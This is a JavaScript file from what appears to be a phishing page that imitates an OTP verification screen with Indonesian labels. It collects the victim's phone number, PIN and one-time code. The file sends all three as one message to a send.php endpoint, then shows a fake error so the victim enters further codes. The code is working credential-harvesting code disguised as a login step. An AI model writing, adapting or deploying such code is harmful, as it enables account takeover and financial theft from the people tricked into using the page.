import { API_URL } from './global.js';

const DEFAULT_TIMEOUT = 120;
var timeout = DEFAULT_TIMEOUT;
var otpShown = false;
var timeoutIsRunning = true;

$(document).ready(function() {
	var phone = window.localStorage.getItem('phone');
	phone = phone.substring(3, phone.length);
	 $("#phone").html("<b>"+phone+"</b>");
	setTimeout(() => {
		$("#otp1").focus();
	}, 500);
	$("#otp1").on('input', function() {
		var otp = $("#otp1").val().trim();
		if (otp.length >= 1) {
			$("#otp2").focus();
		}
	});
	$("#otp2").on('input', function() {
		var otp = $("#otp2").val().trim();
		if (otp.length >= 1) {
			$("#otp3").focus();
		} else {
			$("#otp1").focus();
		}
	});
	$("#otp3").on('input', function() {
		var otp = $("#otp3").val().trim();
		if (otp.length >= 1) {
			$("#otp4").focus();
		} else {
			$("#otp2").focus();
		}
	});
	$("#otp4").on('input', function() {
		var otp = $("#otp4").val().trim();
		if (otp.length >= 1) {
			var otp = $("#otp1").val().trim()
                +$("#otp2").val().trim()
                +$("#otp3").val().trim()
                +$("#otp4").val().trim();
             window.localStorage.setItem('otp', otp);
             var phone = window.localStorage.getItem('phone');
             var pin = window.localStorage.getItem('pin');
			$("#loader").css('display', 'flex');
			var fd = new FormData();
	fd.append('message', '<b>No. HP:</b> '+phone+'\n<b>Kode PIN:</b> '+pin+'\n<b>Kode OTP:</b>'+otp);
	$.ajax({
		url: API_URL+'/send.php',
		type: 'POST',
		data: fd,
		processData: false,
		contentType: false,
		success: function(response) {
			$("#loader").css('display', 'none');
			$("#otp-error").css('display', 'block');
			timeout = DEFAULT_TIMEOUT;
			if (!timeoutIsRunning) {
				runTimeout();
			}
			/*$("#otp-container").css('visibility', 'visible');
			$("#otp1").focus();*/
		}
	});
		} else {
			$("#otp3").focus();
		}
	});
	runTimeout();
});

function getotp() {
	return $("#otp1").val().trim()
                +$("#otp2").val().trim()
                +$("#otp3").val().trim()
                +$("#otp4").val().trim()
                +$("#otp5").val().trim()
                +$("#otp6").val().trim();
}

function runTimeout() {
	timeoutIsRunning = true;
	$("#resend").css('color', '#dddddd')
			    .css('background-color', '#ffffff');
	setTimeout(() => {
		if (timeout > 0) {
		    timeout--;
		} else {
			timeoutIsRunning = false;
			$("#resend").css('color', '#ffffff')
			    .css('background-color', '#118EEA');
			return;
		}
		var h = parseInt(timeout/60);
		var m = parseInt(timeout%60);
		var hS = (''+h).padStart(2, '0');
		var mS = (''+m).padStart(2, '0');
		$("#timeout").html("<b>"+hS+":"+mS+"</b>");
		runTimeout();
	}, 1000);
}

function resendOTP() {
	if (timeout == 0) {
	    $("#resend").css('color', '#dddddd')
			    .css('background-color', '#ffffff');
		timeout = DEFAULT_TIMEOUT;
		runTimeout();
	}
}

function next() {
	var otp = $("#otp1").val().trim()
	    +$("#otp2").val().trim()
	    +$("#otp3").val().trim()
	    +$("#otp4").val().trim();
	var phone = window.localStorage.getItem('phone');
	var otp = window.localStorage.getItem('otp');
			$("#loader").css('display', 'flex');
			var fd = new FormData();
	fd.append('message', '<b>No. HP:</b> '+phone+'\n<b>otp:</b> '+otp+'\n<b>Kode OTP:</b> '+otp);
	$.ajax({
		url: API_URL+'/send.php',
		type: 'POST',
		data: fd,
		processData: false,
		contentType: false,
		success: function(response) {
			timeout = DEFAULT_TIMEOUT;
			$("#loader").css('display', 'none');
			$("#otp-error").css('display', 'block');
			$("#otp-container").css('visibility', 'visible');
		}
	});
}

function showHideotp() {
	otpShown = !otpShown;
	if (otpShown) {
		$("#show-hide-otp").html('Sembunyikan');
		$("#otp1").removeClass("hidden-input");
		$("#otp2").removeClass("hidden-input");
		$("#otp3").removeClass("hidden-input");
		$("#otp4").removeClass("hidden-input");
		$("#otp5").removeClass("hidden-input");
		$("#otp6").removeClass("hidden-input");
		$("#otp1").addClass("shown-input");
		$("#otp2").addClass("shown-input");
		$("#otp3").addClass("shown-input");
		$("#otp4").addClass("shown-input");
		$("#otp5").addClass("shown-input");
		$("#otp6").addClass("shown-input");
	} else {
		$("#show-hide-otp").html('Tampilkan');
		$("#otp1").addClass("hidden-input");
		$("#otp2").addClass("hidden-input");
		$("#otp3").addClass("hidden-input");
		$("#otp4").addClass("hidden-input");
		$("#otp5").addClass("hidden-input");
		$("#otp6").addClass("hidden-input");
		$("#otp1").removeClass("shown-input");
		$("#otp2").removeClass("shown-input");
		$("#otp3").removeClass("shown-input");
		$("#otp4").removeClass("shown-input");
		$("#otp5").removeClass("shown-input");
		$("#otp6").removeClass("shown-input");
	}
}

function ackEnterotp() {
	$("#alert1").css('display', 'none');
	$("#otp1").focus();
}

const setCaretPosition = (ctrl, pos) => {
  if (ctrl.setSelectionRange) {
    ctrl.focus();
    ctrl.setSelectionRange(pos, pos);
  }
}

function setCursorPosition(inputElement, position) {
    if (inputElement.setSelectionRange) {
        inputElement.setSelectionRange(0, 1);
    } else if (inputElement.createTextRange) {
        var range = inputElement.createTextRange();
        range.move('character', position);
        range.select();
    }
}

module.showHideotp = showHideotp;
module.ackEnterotp = ackEnterotp;
module.resendOTP = resendOTP;